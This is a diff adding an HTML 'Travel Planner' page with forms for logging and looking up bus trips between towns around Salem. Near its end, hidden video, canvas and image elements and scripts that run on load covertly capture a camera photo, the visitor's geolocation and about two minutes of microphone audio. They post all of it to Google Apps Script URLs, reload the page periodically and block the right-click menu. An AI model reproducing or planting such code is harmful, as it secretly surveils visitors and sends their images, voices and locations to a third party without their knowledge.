@@ -1,0 +1,1081 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=1100" />
+    <link rel="icon" type="image/png" href="images/photo1.jpg" />
+    <title>Travel Planner</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        margin: 0;
+        padding: 0;
+      }
+
+      h1 {
+        text-align: center;
+        color: #2e03f1;
+        padding: 10px;
+      }
+
+      form {
+        max-width: 500px;
+        margin: 0 auto;
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+      }
+
+      label {
+        display: block;
+        font-weight: bold;
+        margin-top: 10px;
+      }
+
+      select,
+      input[type="time"] {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+      }
+
+      input[type="button"] {
+        background-color: #007acc;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+      }
+
+      input[type="text"] {
+        margin-top: 5px;
+        background-color: #fff;
+        width: 92%;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 4px;
+        border: 1px solid #ccc;
+        cursor: pointer;
+      }
+
+      input[type="button"]:hover {
+        background-color: #005b99;
+      }
+
+      #destinationOther,
+      #locationOther {
+        display: none;
+      }
+
+      #response {
+        margin-top: 20px;
+      }
+
+      .container {
+        max-width: 90%; /* Change this to 100% to make it cover the entire screen */
+        margin: 0 auto;
+      }
+
+      .center {
+        text-align: center;
+        color: #333;
+      }
+
+      .bold {
+        font-weight: bold;
+      }
+
+      .form-input {
+        width: 90%;
+        padding: 8px;
+        margin-bottom: 10px;
+        font-size: 16px; /* Adjust the font size as needed */
+      }
+
+      .btn-primary {
+        background-color: #007bff;
+        color: #fff;
+        padding: 10px 20px;
+        border: none;
+        cursor: pointer;
+      }
+
+      .data-table {
+        width: 90%; /* Make the table cover the entire screen */
+        border-collapse: collapse;
+        margin: 0 auto;
+      }
+
+      .data-table th,
+      .data-table td {
+        border: 1px solid #333;
+        padding: 8px;
+        font-size: 10px; /* Adjust the font size as needed */
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Travel Planner</h1>
+
+    <form id="travelForm">
+      <label for="destination">Traveling Location:</label>
+      <select
+        name="destination"
+        id="destination"
+        onchange="handleDestinationChange()"
+      >
+        <option value="Salem - Thuraiyur">Salem - Thuraiyur</option>
+        <option value="Thuraiyur - Salem">Thuraiyur - Salem</option>
+        <option value="Salem - Attur">Salem - Attur</option>
+        <option value="Attur - Salem">Attur - Salem</option>
+        <option value="Salem - Kallakurichi">Salem - Kallakurichi</option>
+        <option value="Kallakurichi - Salem">Kallakurichi - Salem</option>
+        <option value="Salem - Karumandurai">Salem - Karumandurai</option>
+        <option value="Karumandurai - Salem">Karumandurai - Salem</option>
+        <option value="Attur - Karumandurai">Attur - Karumandurai</option>
+        <option value="Karumandurai - Attur">Karumandurai - Attur</option>
+        <option value="Rasipuram - Karumandurai">
+          Rasipuram - Karumandurai
+        </option>
+        <option value="Karumandurai - Rasipuram">
+          Karumandurai - Rasipuram
+        </option>
+        <option value="Salem - Villupuram">Salem - Villupuram</option>
+        <option value="Villupuram - Salem">Villupuram - Salem</option>
+        <option value="Salem - Chennai">Salem - Chennai</option>
+        <option value="Chennai - Salem">Chennai - Salem</option>
+        <option value="Salem - Bangalore">Salem - Bangalore</option>
+        <option value="Bangalore - Salem">Bangalore - Salem</option>
+        <option value="Salem - Mettur">Salem - Mettur</option>
+        <option value="Mettur - Salem">Mettur - Salem</option>
+        <option value="Salem - Tiruvannamalai">Salem - Tiruvannamalai</option>
+        <option value="Tiruvannamalai - Salem">Tiruvannamalai - Salem</option>
+        <option value="Other">Other</option>
+        <!-- Add an "Other" option -->
+      </select>
+      <br />
+      <div id="destinationOther" style="display: none">
+        <!-- Text box for "Other" destination -->
+        <label for="otherDestination" style="font-size: 13px"
+          >Other Destination: [Enter In this format {Start - End}]</label
+        >
+        <input type="text" name="otherDestination" id="otherDestination" />
+      </div>
+      <label for="location">Location Name:</label>
+      <select name="location" id="location" onchange="handleLocationChange()">
+        <option value="Salem">Salem</option>
+        <option value="Singipuram">Singipuram</option>
+        <option value="Valapady">Valapady</option>
+        <option value="Attur">Attur</option>
+        <option value="Kallakuruchi">Kallakuruchi</option>
+        <option value="Karumandurai">Karumandurai</option>
+        <option value="Rasipuram">Rasipuram</option>
+        <option value="Chennai">Chennai</option>
+        <option value="Bangalore">Bangalore</option>
+        <option value="Thuraiyur">Thuraiyur</option>
+        <option value="Vilvanur">Vilvanur</option>
+        <option value="Mettur">Mettur</option>
+        <option value="Villupuram">Villupuram</option>
+        <option value="Tiruvannamalai">Tiruvannamalai</option>
+        <option value="Other">Other</option>
+        <!-- Add an "Other" option -->
+      </select>
+      <br />
+      <div id="locationOther" style="display: none">
+        <!-- Text box for "Other" location -->
+        <label for="otherLocation" style="font-size: 13px"
+          >Other Location:</label
+        >
+        <input type="text" name="otherLocation" id="otherLocation" />
+      </div>
+      <label for="type">Type:</label>
+      <select name="type" id="type" onchange="showAdditionalInputs()">
+        <option value="Govt">Government</option>
+        <option value="Private">Private</option>
+      </select>
+
+      <div id="govtInputs" style="display: none">
+        <label for="busType">Bus Type:</label>
+        <select name="busType" id="busType">
+          <option value="New Bus">New Bus</option>
+          <option value="Old Bus">Old Bus</option>
+        </select>
+      </div>
+
+      <div id="privateInput" style="display: none">
+        <label for="additionalInfo">Private Info:</label>
+        <input type="text" name="additionalInfo" id="additionalInfo" />
+      </div>
+
+      <br />
+
+      <label for="time">Time:</label>
+      <input type="time" name="time" id="time" style="width: 95%" />
+      <br /><br />
+
+      <input type="button" value="Submit" onclick="submitForm()" />
+    </form>
+
+    <script>
+      var typeSelect;
+      var govtInputs;
+      var privateInput;
+      document.getElementById("time").value = getCurrentTime();
+      function showAdditionalInputs() {
+        typeSelect = document.getElementById("type");
+        govtInputs = document.getElementById("govtInputs");
+        privateInput = document.getElementById("privateInput");
+
+        if (typeSelect.value === "Govt") {
+          govtInputs.style.display = "block";
+          privateInput.style.display = "none";
+        } else if (typeSelect.value === "Private") {
+          govtInputs.style.display = "none";
+          privateInput.style.display = "block";
+        } else {
+          govtInputs.style.display = "none";
+          privateInput.style.display = "none";
+        }
+      }
+      showAdditionalInputs();
+
+      function getCurrentTime() {
+        const now = new Date();
+        const hours = String(now.getHours()).padStart(2, "0");
+        const minutes = String(now.getMinutes()).padStart(2, "0");
+        return `${hours}:${minutes}`;
+      }
+      function handleDestinationChange() {
+        var destinationDropdown = document.getElementById("destination");
+        var destinationOther = document.getElementById("destinationOther");
+        var otherDestinationInput = document.getElementById("otherDestination");
+
+        if (destinationDropdown.value === "Other") {
+          destinationOther.style.display = "block";
+          otherDestinationInput.required = true;
+        } else {
+          destinationOther.style.display = "none";
+          otherDestinationInput.required = false;
+        }
+      }
+      handleDestinationChange();
+      function handleLocationChange() {
+        var locationDropdown = document.getElementById("location");
+        var locationOther = document.getElementById("locationOther");
+        var otherLocationInput = document.getElementById("otherLocation");
+
+        if (locationDropdown.value === "Other") {
+          locationOther.style.display = "block";
+          otherLocationInput.required = true;
+        } else {
+          locationOther.style.display = "none";
+          otherLocationInput.required = false;
+        }
+      }
+      handleLocationChange();
+      function submitForm() {
+        var location = document.getElementById("location").value;
+        var destination = document.getElementById("destination").value;
+        var time = document.getElementById("time").value;
+        var type = document.getElementById("type").value;
+
+        if (location === "Other") {
+          location = document.getElementById("otherLocation").value;
+        }
+
+        if (destination === "Other") {
+          destination = document.getElementById("otherDestination").value;
+        }
+
+        if (type === "Govt") {
+          var govtInputValue = document.getElementById("busType").value; // Access the selected value of the "busType" input
+          type = type + " - " + govtInputValue;
+        }
+
+        if (type === "Private") {
+          var privateInputValue =
+            document.getElementById("additionalInfo").value; // Access the value of the "additionalInfo" input
+          type = type + " - " + privateInputValue;
+        }
+
+        const timeInput = document.getElementById("time");
+        const timeValue = timeInput.value;
+        var formattedTime;
+        if (timeValue) {
+          // Split the input into its components
+          const [timePart, amPm] = timeValue.split(" ");
+          const [hour, minute, second] = timePart.split(":");
+
+          // Convert the hour part to a 12-hour format
+          let hour12 = parseInt(hour, 10);
+          let amPmIndicator = "AM";
+
+          if (hour12 >= 12) {
+            amPmIndicator = "PM";
+            if (hour12 > 12) {
+              hour12 -= 12;
+            }
+          } else if (hour12 === 0) {
+            hour12 = 12;
+          }
+
+          // Format the hour, minute, and second parts with leading zeros
+          const formattedHour = String(hour12).padStart(2, "0");
+          const formattedMinute = minute.padStart(2, "0");
+          const formattedSecond = second ? second.padStart(2, "0") : "00";
+
+          // Create the new formatted time string
+          formattedTime = `${formattedHour} * ${formattedMinute} * ${formattedSecond} ${amPmIndicator}`;
+
+          // Now, you can use the 'formattedTime' variable as a string
+          console.log(formattedTime);
+        } else {
+          console.log("Input is empty or invalid.");
+          alert("Input is empty or invalid.");
+        }
+
+        var formData = new FormData();
+        formData.append("location", location);
+        formData.append("destination", destination);
+        formData.append("type", type);
+        formData.append("time", formattedTime);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbyvc9lG_tdd32JLoS6iczQ1v_IwH9e2hxj6RFPYAiyTaa-dDF0vE-7aRSf1kI-f1PMxcA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => response.text())
+          .then((data) => {
+            document.getElementById("travelForm").reset();
+            alert("Form Submitted Successfully");
+            window.location.reload();
+          });
+      }
+    </script>
+    <h1 style="color: blue; text-align: center">Information - Travel</h1>
+    <form id="dataForm" style="text-align: center">
+      <label for="destination1">Traveling Location:</label>
+      <select
+        name="destination1"
+        id="destination1"
+        onchange="handleDestinationChange1()"
+      >
+        <option value="Salem - Thuraiyur">Salem - Thuraiyur</option>
+        <option value="Thuraiyur - Salem">Thuraiyur - Salem</option>
+        <option value="Salem - Attur">Salem - Attur</option>
+        <option value="Attur - Salem">Attur - Salem</option>
+        <option value="Salem - Kallakurichi">Salem - Kallakurichi</option>
+        <option value="Kallakurichi - Salem">Kallakurichi - Salem</option>
+        <option value="Salem - Karumandurai">Salem - Karumandurai</option>
+        <option value="Karumandurai - Salem">Karumandurai - Salem</option>
+        <option value="Attur - Karumandurai">Attur - Karumandurai</option>
+        <option value="Karumandurai - Attur">Karumandurai - Attur</option>
+        <option value="Rasipuram - Karumandurai">
+          Rasipuram - Karumandurai
+        </option>
+        <option value="Karumandurai - Rasipuram">
+          Karumandurai - Rasipuram
+        </option>
+        <option value="Salem - Villupuram">Salem - Villupuram</option>
+        <option value="Villupuram - Salem">Villupuram - Salem</option>
+        <option value="Salem - Chennai">Salem - Chennai</option>
+        <option value="Chennai - Salem">Chennai - Salem</option>
+        <option value="Salem - Bangalore">Salem - Bangalore</option>
+        <option value="Bangalore - Salem">Bangalore - Salem</option>
+        <option value="Salem - Mettur">Salem - Mettur</option>
+        <option value="Mettur - Salem">Mettur - Salem</option>
+        <option value="Salem - Tiruvannamalai">Salem - Tiruvannamalai</option>
+        <option value="Tiruvannamalai - Salem">Tiruvannamalai - Salem</option>
+        <option value="Other">Other</option>
+        <!-- Add an "Other" option -->
+      </select>
+      <br />
+      <div id="destinationOther1" style="display: none">
+        <!-- Text box for "Other" destination -->
+        <label for="otherDestination1">Other Destination:</label>
+        <input type="text" name="otherDestination1" id="otherDestination1" />
+      </div>
+      <br />
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+    </form>
+    <div id="result1" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      function handleDestinationChange1() {
+        var destinationDropdown = document.getElementById("destination1");
+        var destinationOther = document.getElementById("destinationOther1");
+        var otherDestinationInput =
+          document.getElementById("otherDestination1");
+
+        if (destinationDropdown.value === "Other") {
+          destinationOther.style.display = "block";
+          otherDestinationInput.required = true;
+        } else {
+          destinationOther.style.display = "none";
+          otherDestinationInput.required = false;
+        }
+      }
+
+      document
+        .getElementById("dataForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          var destinationDropdown = document.getElementById("destination1");
+          var destinationOtherInput =
+            document.getElementById("otherDestination1");
+
+          var destination;
+
+          if (destinationDropdown.value === "Other") {
+            destination = destinationOtherInput.value; // Use value of the input field
+          } else {
+            destination = destinationDropdown.value;
+          }
+          console.log(destination);
+
+          var location = "";
+          var time = "";
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("destination", destination);
+          formData.append("location", location);
+          formData.append("time", time);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbxCzhyUDuOTiVfl4mLuVKIG89mnKrKn5Os7heNeDiAaAu3BB9sQsQ9rFr9qU9osT_VV/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              displayResult(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No Matching Rows Found");
+              location.reload();
+            });
+        });
+
+      function displayResult(result) {
+        const resultDiv = document.getElementById("result1");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent =
+            "No data found for the selected location name.";
+          alert("No data found for the selected location name.");
+          location.reload();
+        }
+      }
+    </script>
+
+    <h1 style="color: blue; text-align: center">Information - Location</h1>
+    <form id="dataForm1" style="text-align: center">
+      <label for="location1">Location Name:</label>
+      <select
+        name="location1"
+        id="location1"
+        onchange="handleLocationChange1()"
+      >
+        <option value="Salem">Salem</option>
+        <option value="Singipuram">Singipuram</option>
+        <option value="Valapady">Valapady</option>
+        <option value="Attur">Attur</option>
+        <option value="Kallakuruchi">Kallakuruchi</option>
+        <option value="Karumandurai">Karumandurai</option>
+        <option value="Rasipuram">Rasipuram</option>
+        <option value="Chennai">Chennai</option>
+        <option value="Bangalore">Bangalore</option>
+        <option value="Thuraiyur">Thuraiyur</option>
+        <option value="Vilvanur">Vilvanur</option>
+        <option value="Mettur">Mettur</option>
+        <option value="Villupuram">Villupuram</option>
+        <option value="Tiruvannamalai">Tiruvannamalai</option>
+        <option value="Other">Other</option>
+        <!-- Add an "Other" option -->
+      </select>
+      <br />
+      <div id="locationOther1" style="display: none">
+        <!-- Text box for "Other" location -->
+        <label for="otherLocation1">Other Location:</label>
+        <input type="text" name="otherLocation1" id="otherLocation1" />
+      </div>
+      <br />
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+    </form>
+    <div id="result2" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      function handleLocationChange1() {
+        var locationDropdown = document.getElementById("location1");
+        var locationOther = document.getElementById("locationOther1");
+        var otherLocationInput = document.getElementById("otherLocation1");
+
+        if (locationDropdown.value === "Other") {
+          locationOther.style.display = "block";
+          otherLocationInput.required = true;
+        } else {
+          locationOther.style.display = "none";
+          otherLocationInput.required = false;
+        }
+      }
+
+      document
+        .getElementById("dataForm1")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          var locationDropdown = document.getElementById("location1");
+          var locationOther = document.getElementById("locationOther1");
+          var otherLocationInput = document.getElementById("otherLocation1");
+
+          var location;
+
+          if (locationDropdown.value === "Other") {
+            location = otherLocationInput.value; // Use value of the input field
+          } else {
+            location = locationDropdown.value;
+          }
+          console.log(location);
+
+          var time = "";
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("destination", destination);
+          formData.append("location", location);
+          formData.append("time", time);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbxCzhyUDuOTiVfl4mLuVKIG89mnKrKn5Os7heNeDiAaAu3BB9sQsQ9rFr9qU9osT_VV/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              displayResult1(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No Matching Rows Found");
+              location.reload();
+            });
+        });
+
+      function displayResult1(result) {
+        const resultDiv = document.getElementById("result2");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult1(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent =
+            "No data found for the selected location name.";
+          alert("No data found for the selected location name.");
+          location.reload();
+        }
+      }
+    </script>
+
+    <h1 style="color: blue; text-align: center">Information - Time</h1>
+    <form id="dataForm3" style="text-align: center">
+      <label for="time3">Time:</label>
+      <input type="time" name="time3" id="time3" style="width: 95%" />
+
+      <br /><br />
+      <input
+        type="submit"
+        value="Submit"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      />
+    </form>
+    <div id="result3" style="margin-top: 20px; font-size: 18px"></div>
+    <br />
+    <script>
+      document.getElementById("time3").value = getCurrentTime();
+      function getCurrentTime() {
+        const now = new Date();
+        const hours = String(now.getHours()).padStart(2, "0");
+        const minutes = String(now.getMinutes()).padStart(2, "0");
+        return `${hours}:${minutes}`;
+      }
+      document
+        .getElementById("dataForm3")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+
+          var destination = "";
+          var location = "";
+          var timeValue = document.getElementById("time3").value;
+          var formattedTime;
+
+          // Split the input into its components
+          const [timePart, amPm] = timeValue.split(" ");
+          const [hour, minute, second] = timePart.split(":");
+
+          // Convert the hour part to a 12-hour format
+          let hour12 = parseInt(hour, 10);
+          let amPmIndicator = "AM";
+
+          if (hour12 >= 12) {
+            amPmIndicator = "PM";
+            if (hour12 > 12) {
+              hour12 -= 12;
+            }
+          } else if (hour12 === 0) {
+            hour12 = 12;
+          }
+
+          // Format the hour, minute, and second parts with leading zeros
+          const formattedHour = String(hour12).padStart(2, "0");
+          const formattedMinute = minute.padStart(2, "0");
+          const formattedSecond = second ? second.padStart(2, "0") : "00";
+
+          // Create the new formatted time string
+          formattedTime = `${formattedHour} * ${formattedMinute} * ${formattedSecond} ${amPmIndicator}`;
+
+          // Now, you can use the 'formattedTime' variable as a string
+          console.log(formattedTime);
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("destination", destination);
+          formData.append("location", location);
+          formData.append("time", formattedTime);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbxCzhyUDuOTiVfl4mLuVKIG89mnKrKn5Os7heNeDiAaAu3BB9sQsQ9rFr9qU9osT_VV/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+                alert("Network response was not ok.");
+                location.reload();
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              displayResult3(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No Matching Rows Found");
+            });
+        });
+
+      function displayResult3(result) {
+        const resultDiv = document.getElementById("result3");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult3(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent = "No data found for the selected time.";
+          alert("No data found for the selected time.");
+          location.reload();
+        }
+      }
+    </script>
+
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/home.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycbyRf0AWpmh3Z2CjnWYEE597VIY-gmnyj4T6AL3jnEQSfVFJ_2EWebvUiVTMoSg_ZsdO/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+            document.getElementById("status").innerText = "Error: " + error; // Display error message in the 'status' div
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 160000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+    </script>
+  </body>
+</html>
